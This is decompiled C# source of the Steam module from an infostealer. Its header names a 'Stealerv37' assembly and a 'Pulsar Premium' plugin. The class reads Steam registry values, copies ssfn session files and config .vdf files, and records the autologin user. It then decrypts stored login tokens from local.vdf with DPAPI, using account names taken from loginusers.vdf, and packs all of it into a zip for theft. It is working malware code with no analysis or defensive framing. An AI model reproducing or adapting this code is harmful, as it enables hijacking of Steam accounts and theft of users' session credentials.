// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Games.Steam
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

#nullable disable
namespace Intelix.Targets.Games;

public class Steam : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
    if (registryKey1 == null || registryKey1.GetValue("SteamPath") == null)
      return;
    string str1 = registryKey1.GetValue("SteamPath").ToString();
    if (!Directory.Exists(str1))
      return;
    string path1 = nameof (Steam);
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Steam);
    try
    {
      RegistryKey registryKey2 = registryKey1.OpenSubKey("Apps");
      if (registryKey2 != null)
      {
        List<string> values = new List<string>();
        foreach (string subKeyName in registryKey2.GetSubKeyNames())
        {
          using (RegistryKey registryKey3 = registryKey1.OpenSubKey("Apps\\" + subKeyName))
          {
            if (registryKey3 != null)
            {
              if (!(registryKey3.GetValue("Name") is string str2))
                str2 = "Unknown";
              string str3 = str2;
              string str4 = ((int?) registryKey3.GetValue("Installed")).GetValueOrDefault() == 1 ? "Yes" : "No";
              string str5 = ((int?) registryKey3.GetValue("Running")).GetValueOrDefault() == 1 ? "Yes" : "No";
              string str6 = ((int?) registryKey3.GetValue("Updating")).GetValueOrDefault() == 1 ? "Yes" : "No";
              values.Add($"Application: {str3}\n\tGameID: {subKeyName}\n\tInstalled: {str4}\n\tRunning: {str5}\n\tUpdating: {str6}");
            }
          }
        }
        if (values.Count > 0)
        {
          string entryPath = Path.Combine(path1, "Apps.txt");
          zip.AddTextFile(entryPath, string.Join("\n\n", (IEnumerable<string>) values));
          counterApplications.Files.Add("Software\\Valve\\Steam\\Apps => " + entryPath);
        }
      }
    }
    catch
    {
    }
    try
    {
      foreach (string file in Directory.GetFiles(str1))
      {
        if (file.Contains("ssfn"))
        {
          byte[] content = File.ReadAllBytes(file);
          string entryPath = Path.Combine(path1, "ssfn", Path.GetFileName(file));
          zip.AddFile(entryPath, content);
          counterApplications.Files.Add($"{file} => {entryPath}");
        }
      }
    }
    catch
    {
    }
    try
    {
      string path = Path.Combine(str1, "config");
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path, "*.vdf"))
        {
          string entryPath = Path.Combine(path1, "configs", Path.GetFileName(file));
          zip.AddFile(entryPath, File.ReadAllBytes(file));
          counterApplications.Files.Add($"{file} => {entryPath}");
        }
      }
    }
    catch
    {
    }
    try
    {
      string text = $"Autologin User: {registryKey1.GetValue("AutoLoginUser")?.ToString() ?? "Unknown"}\nRemember password: {(((int?) registryKey1.GetValue("RememberPassword")).GetValueOrDefault() == 1 ? "Yes" : "No")}";
      string entryPath = Path.Combine(path1, "SteamInfo.txt");
      zip.AddTextFile(entryPath, text);
      counterApplications.Files.Add("Software\\Valve\\Steam => " + entryPath);
    }
    catch
    {
    }
    try
    {
      string[] source1 = new string[2]
      {
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), nameof (Steam), "local.vdf"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), nameof (Steam), "local.vdf")
      };
      string[] source2 = new string[2]
      {
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), nameof (Steam), "config", "loginusers.vdf"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), nameof (Steam), "config", "loginusers.vdf")
      };
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      string path2 = ((IEnumerable<string>) source1).FirstOrDefault<string>(Steam.\u003C\u003EO.\u003C0\u003E__Exists ?? (Steam.\u003C\u003EO.\u003C0\u003E__Exists = new Func<string, bool>(File.Exists)));
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      string path3 = ((IEnumerable<string>) source2).FirstOrDefault<string>(Steam.\u003C\u003EO.\u003C0\u003E__Exists ?? (Steam.\u003C\u003EO.\u003C0\u003E__Exists = new Func<string, bool>(File.Exists)));
      if (path2 == null || path3 == null)
        return;
      string pattern1 = "\"AccountName\"\\s*\"([^\"]+)\"";
      string pattern2 = "([a-fA-F0-9]{500,2000})";
      MatchCollection matchCollection1 = Regex.Matches(File.ReadAllText(path3), pattern1);
      MatchCollection matchCollection2 = Regex.Matches(File.ReadAllText(path2), pattern2);
      if (matchCollection1.Count == 0 || matchCollection2.Count == 0)
        return;
      List<string> values = new List<string>();
      foreach (Match match1 in matchCollection1)
      {
        byte[] bytes1 = Encoding.UTF8.GetBytes(match1.Groups[1].Value);
        foreach (Match match2 in matchCollection2)
        {
          Match tokenMatch = match2;
          byte[] array = Enumerable.Range(0, tokenMatch.Value.Length / 2).Select<int, byte>((Func<int, byte>) (x => Convert.ToByte(tokenMatch.Value.Substring(x * 2, 2), 16 /*0x10*/))).ToArray<byte>();
          try
          {
            byte[] bytes2 = ProtectedData.Unprotect(array, bytes1, DataProtectionScope.LocalMachine);
            values.Add(Encoding.UTF8.GetString(bytes2));
            break;
          }
          catch
          {
          }
        }
      }
      if (values.Count > 0)
      {
        string entryPath = Path.Combine(path1, "Token.txt");
        zip.AddTextFile(entryPath, string.Join("\n", (IEnumerable<string>) values));
        counterApplications.Files.Add($"{path2} => {entryPath}");
        counterApplications.Files.Add($"{path3} => {entryPath}");
      }
    }
    catch
    {
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("Steam\\");
    counter.Games.Add(counterApplications);
  }
}
